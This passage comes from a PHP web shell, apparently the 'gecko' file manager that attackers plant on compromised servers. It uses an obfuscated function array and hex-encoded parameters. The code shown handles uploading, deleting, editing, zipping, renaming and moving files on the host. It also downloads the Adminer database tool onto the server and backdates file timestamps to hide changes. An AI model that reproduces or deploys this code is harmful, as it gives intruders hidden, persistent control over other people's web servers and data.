                form.method = 'POST';
                form.action = window.location.href;
                Object.keys(data).forEach(function(k){
                var i = document.createElement('input');
                i.type='hidden'; i.name=k; i.value=data[k];
                form.appendChild(i);
                });
                document.body.appendChild(form);
                form.submit();
            }
        })();
    </script>

<?php
    // ═══════════════════════════════════════════════════════════════
    // POST HANDLERS
    // ═══════════════════════════════════════════════════════════════
    if(isset($_GET['adminer'])){
        $URL="https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
        if(!$fungsi[3]('adminer.php')){$fungsi[28]("adminer.php",$fungsi[11]($URL));refreshPages();}
    }

    if($_SERVER['REQUEST_METHOD']==='POST'){
        if(isset($_FILES['gecko-upload'])&&isset($_POST['gecko-up-submit'])){
            $name=$_FILES['gecko-upload']['name'];$tmp=$_FILES['gecko-upload']['tmp_name'];$sz=$_FILES['gecko-upload']['size'];
            if($sz>0&&is_uploaded_file($tmp)){$tgt=$fungsi[0]().'/'.$name;if(!$fungsi[29]($tmp,$tgt))copy($tmp,$tgt);}
            refreshPages();
        }
        if(isset($_POST['btn-delete'])){
            delete_recursive_directory(str_replace("\\","/",$fungsi[0]()).'/'.$_POST['btn-delete']);refreshPages();
        }
        if(isset($_POST['btn-zip'])){
            $fd=str_replace("\\","/",$fungsi[0]()).'/'.$_POST['btn-zip'];
            compressToZip($fd,pathinfo($fd,PATHINFO_FILENAME).'.zip');refreshPages();
        }
        if(isset($_POST['btn-unzip'])){
            $fd=str_replace("\\","/",$fungsi[0]()).'/'.$_POST['btn-unzip'];
            if(is_file($fd)&&strtolower(pathinfo($fd,PATHINFO_EXTENSION))==='zip')extractFromZip($fd,str_replace("\\","/",$fungsi[0]()));
            refreshPages();
        }
        if(isset($_POST['submit'])){
            if(!empty($_POST['create_folder'])){$fungsi[12]($_POST['create_folder']);refreshPages();}
            if(!empty($_POST['create_file'])){$fungsi[13]($_POST['create_file']);refreshPages();}
            if(!empty($_POST['renameFile'])){$fungsi[15](decrypt_hex($_GET['re']),$_POST['renameFile']);refreshPages();}
        }
        if(isset($_POST['btn-save-file'])){
            $fungsi[28](str_replace("\\","/",$fungsi[0]()).'/'.decrypt_hex($_GET['f']),$_POST['edited_code_data']);refreshPages();
        }
        if(isset($_POST['btn-touch'])){
            $path=str_replace("\\","/",$fungsi[0]()).'/'.decrypt_hex($_GET['touch']);
            $h=max(0,min(23,intval($_POST['touch_hour']??0)));
            $mi=max(0,min(59,intval($_POST['touch_minute']??0)));
            $d=max(1,min(31,intval($_POST['touch_day']??1)));
            $mo=max(1,min(12,intval($_POST['touch_month']??1)));
            $y=max(1970,min(2099,intval($_POST['touch_year']??date('Y'))));
            $ts=mktime($h,$mi,0,$mo,$d,$y);
            if($ts&&file_exists($path)){@touch($path,$ts,$ts);clearstatcache();}
            refreshPages();
        }

        // ─── Context menu: Copy / Cut / Paste ────────────────────
        if(isset($_POST['ctx_action']) && isset($_POST['ctx_item'])){
            $action  = $_POST['ctx_action'];  // 'copy' or 'cut'
            $item    = basename($_POST['ctx_item']); // sanitize — filename only
            $src     = str_replace("\\","/",$fungsi[0]()).'/'.$item;
            $destDir = str_replace("\\","/",$fungsi[0]());

            if(in_array($action,['copy','cut']) && file_exists($src)){
                // Store in session clipboard
                $_SESSION['clipboard'] = [
                    'src'    => $src,
                    'item'   => $item,
                    'action' => $action,
                ];
            }
            refreshPages();
        }
    }

    // ─── Paste: handle on page load if clipboard set in session ──
    if(isset($_GET['ctx_paste']) && isset($_SESSION['clipboard'])){
        $cb      = $_SESSION['clipboard'];
        $src     = $cb['src'];
        $item    = $cb['item'];
        $action  = $cb['action'];
        $destDir = str_replace("\\","/",$fungsi[0]());
        $dest    = $destDir.'/'.$item;

        if(file_exists($src)){
            // Avoid overwriting: append _copy if same location
            if($dest === $src){ $dest = $destDir.'/copy_'.$item; }

            function copy_recursive($s,$d){
                if(is_file($s)){ return copy($s,$d); }
                if(!is_dir($d)) mkdir($d,0755,true);
                $ok=true;
                foreach(glob($s.'/{*,.[!.]*}',GLOB_BRACE) as $f){
                    $ok = copy_recursive($f,$d.'/'.basename($f)) && $ok;
                }
                return $ok;
            }

            if($action==='copy'){
                copy_recursive($src,$dest);
            } elseif($action==='cut'){
                if(@rename($src,$dest)===false){
                    // rename across fs: copy then delete
                    copy_recursive($src,$dest);
                    delete_recursive_directory($src);
                }
                unset($_SESSION['clipboard']);
            }
        }
        refreshPages();
    }
?>
